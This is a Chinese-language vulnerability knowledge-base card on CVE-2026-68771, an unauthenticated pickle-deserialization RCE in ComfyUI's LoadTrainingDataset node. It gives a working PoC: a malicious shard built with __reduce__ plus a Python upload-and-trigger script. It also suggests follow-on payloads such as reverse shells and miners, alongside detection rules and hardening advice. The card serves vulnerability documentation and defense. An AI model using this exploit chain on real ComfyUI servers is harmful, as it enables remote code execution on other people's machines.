---
id: web-python-deserialization-comfyui-loadtrainingdataset-torch-load-pickle-rce
title: ComfyUI LoadTrainingDataset 裸调 torch.load：无认证上传恶意分片 + /prompt 触发反序列化 RCE（CVE-2026-68771）
type: scenario
domain: web
path: web/python/deserialization
technique: comfyui-loadtrainingdataset-torch-load-pickle-rce
tags:
- python
- comfyui
- pickle
- deserialization
- torch
- rce
- unauthenticated
- upload
- cve-2026-68771
- ai
cve:
- CVE-2026-68771
severity: critical
confidence: high
status: verified
affected_versions: ComfyUI v0.22.0 ~ v0.25.0（v0.26.0 修复）
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V107
  verified_at: '2026-11-05T22:25:21+08:00'
  notes: 已对照原文与10张图核对：CVE-2026-68771、GHSA-6p72-9j26-4rmx、受影响 v0.22.0~v0.25.0、修复 commit 94ee49b/v0.26.0、v0.23.1 不存在、torch 2.5.1 复现与 weights_only=True 对照组、两个 HTTP 请求的 PoC 与截图均一致。未验证点：本库未复跑 PoC；frontmatter 无 sources/source_url（正文参考文献含 VulnCheck/GHSA/NVD/commit 链接）。
url: /docs/web/python/deserialization/web-python-deserialization-comfyui-loadtrainingdataset-torch-load-pickle-rce/
draft: false
kb_aliases:
- CVE-2026-68771
- GHSA-6p72-9j26-4rmx
- ComfyUI LoadTrainingDataset RCE
- ComfyUI 反序列化 RCE
- torch.load 反序列化
- weights_only 绕过
- shard_0000.pkl
- ComfyUI 9.3 分漏洞
---

## 一句话结论

ComfyUI v0.22.0 ~ v0.25.0 自带的 `LoadTrainingDataset` 节点在加载 `output` 目录下的 `shard_*.pkl` 时裸调 `torch.load(f)`（未传 `weights_only=True`）；而未认证的 `/upload/image` 接口允许 `type=output` 直写 output 目录且没有扩展名白名单，攻击者先用一个请求上传恶意 pickle 分片，再用一个 `/prompt` 请求触发节点执行，`__reduce__` 在反序列化阶段调用 `os.system`，以 ComfyUI 进程权限实现无认证 RCE（CVE-2026-68771，CVSS 9.3）。

## 原理

- **漏洞点在训练数据集加载路径**：`comfy_extras/nodes_dataset.py` 的 `LoadTrainingDataset` 节点把 `folder_name` 拼到 ComfyUI output 目录后，列出所有以 `shard_` 开头、`.pkl` 结尾的分片文件，逐个 `with open(shard_path, "rb") as f: shard_data = torch.load(f)`。该节点由 PR #11117（训练器重构）在 2025-12-18 合入，属于实验性功能（`is_experimental=True`）。
- **torch.load 底层是 pickle**：`torch.load` 默认使用 pickle 反序列化；pickle 在还原对象时会调用对象 `__reduce__()` 返回的 `(callable, args)`，即直接执行任意可调用对象。一个返回 `(os.system, ("id > /tmp/pwned",))` 的类即可在 unpickle 阶段执行命令，根本轮不到节点后续的 `shard_data["latents"]` 逻辑。
- **唯一漏网之鱼**：ComfyUI 模型加载主路径 `comfy/utils.py` 的 `load_torch_file()` 早已传入 `weights_only=True`，修复 commit 也说明这是代码库里唯一一处没传该参数的 `torch.load`。原因是训练数据集路径的信任边界错位：分片文件放在服务器自己的 output 目录，不代表其内容可信。
- **weights_only 的版本分水岭**：PyTorch 2.6 起把 `torch.load` 的 `weights_only` 默认值从 False 翻转为 True；`weights_only=True` 时使用受限 Unpickler，只允许 tensor 和基本类型，`os.system` 等全局引用不在白名单，反序列化在还原阶段抛 `UnpicklingError: Weights only load failed`，命令不执行。torch 2.5.x 及更早默认 False，同一份漏洞代码仍可利用。原文复现环境因此必须 pin `torch==2.5.1`；在 torch 2.6+ 上即使 ComfyUI 未修复，payload 也会被默认值拦截。
- **上传面**：ComfyUI 默认监听 8188 且无认证（不使用 `--listen` 时仅本机，但大量实例暴露公网）。`/upload/image` 的 `image_upload()` 用 `get_dir_by_type(type)` 选择目录，`type` 支持 `input`/`temp`/`output`；`output` 可直写 output 目录，无需目录穿越。路径只做 `os.path.commonpath((upload_dir, filepath)) == upload_dir` 的包含校验，没有扩展名白名单，`.pkl` 原样落盘；文件名可控（`shard_0000.pkl`），`overwrite=true` 可覆盖。
- **触发面与图校验**：`/prompt` 在入队前要求工作流至少有一个输出节点（`SaveImage`/`PreviewImage` 等），只提交 `LoadTrainingDataset` 会得到 `prompt_no_outputs`。把 `LoadTrainingDataset` 的 `latents` 输出接到 `PreviewAny`（自带节点，接受任意类型且属于输出节点）即可通过校验；RCE 在 `LoadTrainingDataset.execute()` 内 `torch.load` 时已经发生，`PreviewAny` 只是给校验器看的。
- **无异常痕迹**：`os.system` 返回 int，被 `extend` 进 latents 列表，节点逻辑正常完成；`/history` 显示 `status: success`、`completed: true`，没有报错。命令执行副作用完全发生在 HTTP 响应之外，因此无文件落地 payload（反弹 shell、内存马）更隐蔽。
- **版本考古**：漏洞代码从 2025-12-18 合入主干，随 v0.22.0（2026-05-20）发布；v0.23.0、v0.24.0、v0.25.0 均带洞；修复 commit `94ee49b`（2026-06-18）加 `weights_only=True`；v0.26.0（2026-06-23）为修复版本。中文转述常说的“v0.23.1 修复”是错误信息——v0.23.1 这个版本不存在。官方把该 commit 称为 harden/defense-in-depth，未按安全漏洞发布 reviewed advisory。

## 触发条件

- ComfyUI v0.22.0 ~ v0.25.0（v0.21.x 无该节点；v0.26.0 已修复）。
- 运行环境使用 torch 2.5.x 或更早（`weights_only` 默认 False）；torch 2.6+ 默认 True，会拦截任意对象反序列化，利用不成立。
- ComfyUI 的 8188 端口可从攻击者网络访问，且未启用认证/反代认证；默认部署本身无认证。
- `/upload/image` 与 `/prompt` 可达，output 目录可写，代理/WAF 未拦截非图片扩展名上传。
- 工作流中除 `LoadTrainingDataset` 外还需一个输出节点（如 `PreviewAny`）以通过 `/prompt` 的图校验。
- ComfyUI 进程以其运行用户权限执行命令；若该用户属于 `docker` 等特权组，RCE 可进一步扩大破坏半径。

## 利用步骤

1. **确认版本与 torch**：确认 ComfyUI 版本在 v0.22.0~v0.25.0，且 `torch.__version__` 为 2.5.x 或更早；访问 `http://host:8188/` 确认服务可达。
2. **构造恶意分片**：定义一个 `__reduce__` 返回 `(os.system, (cmd,))` 的类，外面套上与正常 `SaveTrainingDataset` 输出一致的 dict（含 `latents`、`conditioning` 键），用 `torch.save` 写成标准 PyTorch zip 格式的 `shard_0000.pkl`（直接裸 pickle 在部分 torch 版本组合下会走异常分支，用 `torch.save` 最稳）。
3. **上传**：`POST /upload/image`，`multipart/form-data` 的 `image` 字段放 payload 文件，表单字段 `type=output`、`overwrite=true`；响应 `200 {"name":"shard_0000.pkl","subfolder":"","type":"output"}` 表示已写入 output 目录。
4. **触发**：`POST /prompt`，提交包含 `class_type: LoadTrainingDataset`（`folder_name` 为空字符串，表示 output 根目录）和 `PreviewAny`（`source` 接 LoadTrainingDataset 的 latents 输出）的工作流；`200 {"prompt_id": "...", "node_errors": {}}` 表示入队成功。
5. **确认执行**：轮询 `GET /history/<prompt_id>`，看到 `status: success`、`completed: true`；在目标侧检查 marker 文件（原文为 `/tmp/pwned`），内容为 `id` 输出，身份是 ComfyUI 进程用户。
6. **后续利用**：把 `os.system` 命令替换为反弹 shell、写 crontab、下载挖矿二进制或内存马；无文件 payload 不落盘，ComfyUI 界面和执行历史均无异常。

## PoC

生成恶意分片：

```python
# gen_payload.py
import os
import torch

class RCE:
    def __reduce__(self):
        return (os.system, ("id > /tmp/pwned 2>&1",))

data = {"latents": [RCE()], "conditioning": []}
torch.save(data, "shard_0000.pkl")
print("[+] payload written: shard_0000.pkl")
```

上传、触发、轮询：

```python
# exploit_chain.py
import sys, time, requests

BASE = f"http://{sys.argv[1]}" if len(sys.argv) > 1 else "http://127.0.0.1:8188"
PAYLOAD = "shard_0000.pkl"

with open(PAYLOAD, "rb") as f:
    r = requests.post(
        f"{BASE}/upload/image",
        files={"image": (PAYLOAD, f, "application/octet-stream")},
        data={"type": "output", "overwrite": "true"},
    )
print("[1] upload:", r.status_code, r.text.strip())

workflow = {
    "prompt": {
        "42": {
            "class_type": "LoadTrainingDataset",
            "inputs": {"folder_name": ""},
        },
        "43": {
            "class_type": "PreviewAny",
            "inputs": {"source": ["42", 0]},
        },
    },
    "client_id": "poc",
}
r = requests.post(f"{BASE}/prompt", json=workflow)
print("[2] prompt:", r.status_code, r.text.strip())
prompt_id = r.json().get("prompt_id", "")

for _ in range(20):
    time.sleep(0.5)
    h = requests.get(f"{BASE}/history/{prompt_id}").json()
    if prompt_id in h:
        st = h[prompt_id]["status"]
        print("[3] status:", st.get("status_str"), "| completed:", st.get("completed"))
        break
```

原文实测输出：upload 200、prompt 200、status success；`/tmp/pwned` 内容为 `uid=1000(ookini) gid=1000(ookini) ... 124(docker)`。对照组 `torch.load(f, weights_only=True)` 抛 `UnpicklingError: Weights only load failed`，命令未执行。

## 变体与关联

- **folder_name 路径穿越备用线**：读取侧 `folder_name` 未做路径清洗，`../input` 可把基准目录穿到 input；若未来 `type=output` 上传被收紧，仍可通过 `type=input` 上传 + `folder_name=../input` 加载。原文明确说未实测这条线，仅作为冗余攻击面记录。
- **其他 pickle 类扩展名**：服务端只按 `shard_*.pkl` 匹配，但同类 torch 加载点可接受 `.pth`/`.ckpt`/`.pt`；检测与上传过滤应覆盖全部 pickle 家族扩展名。
- **weights_only=False 的其他 sink**：任何未显式传 `weights_only=True` 的 `torch.load` 都是同类风险；在 torch 2.6+ 上默认值兜底，但 pin 老版本 torch 的生态（自定义节点、旧教程）仍长期暴露。
- **官方修复与绕过**：commit `94ee49b` 仅加 `weights_only=True`；官方未发布 reviewed 安全公告、未按 CVE 修复流程处理。升级 ComfyUI 与升级 torch 是两层独立防线，缺一不可。
- **关联卡片**：[[web-python-comfyui-manager-weak-config-git-clone-reboot-rce]]（同一产品的扩展漏洞，CVE-2025-67303）、[[ai-security-supply-chain-huggingface-pickle-model-reverse-shell]]（PyTorch pickle 模型加载的同类风险）、[[web-python-deserialization-ply-yacc-picklefile-rce]]（文件路径可控即 pickle 反序列化的通用模式）。

## 检测与防御

- **版本升级**：升级 ComfyUI 到 v0.26.0+（代码层修复），同时升级 torch 到 2.6+（默认 `weights_only=True` 的运行时兜底）。只做其中一层，另一层仍是缺口。
- **网络边界**：8188 端口不要直接暴露公网；远程使用走带认证的反向代理，或在防火墙做来源白名单。Censys 观测到的挖矿受害者几乎都是裸奔实例。
- **上传面收敛**：没有训练需求时，在反代层限制 `/upload/image` 的 `type=output` 写入；对上传文件名做扩展名白名单/黑名单，拒绝 `.pkl`、`.pth`、`.ckpt`、`.pt` 等 pickle 格式；同时限制 `folder_name` 中的 `..` 路径穿越。
- **检测规则（HTTP 层）**：第一阶段匹配 `POST /upload/image` 的 multipart 中出现 `filename="*.pkl|pth|ckpt|pt"`；第二阶段匹配 `POST /prompt` 请求体包含 `LoadTrainingDataset`。两阶段紧邻出现时告警（训练节点正常调用频率极低，误报负担小）。Nginx/Suricata 日志均可覆盖。
- **运行时降权**：用专用低权限用户运行 ComfyUI，避免使用日常用户或具备 `docker`、`sudo` 组的账号；对自托管 AI 服务做容器/沙箱隔离，限制进程可写目录与网络出站。
- **安全加载实践**：代码中统一 `torch.load(..., weights_only=True)`；优先使用 `safetensors` 等非执行型格式；对 output/input 目录做完整性校验，不允许未认证上传写入可被加载的序列化文件。
- **监控与应急**：监控 output 目录中由 HTTP 上传产生的 `shard_*.pkl`；发现可疑分片后隔离主机、检查 ComfyUI 进程用户与子进程、排查 crontab/启动项与出站连接，轮换该主机上的凭据。
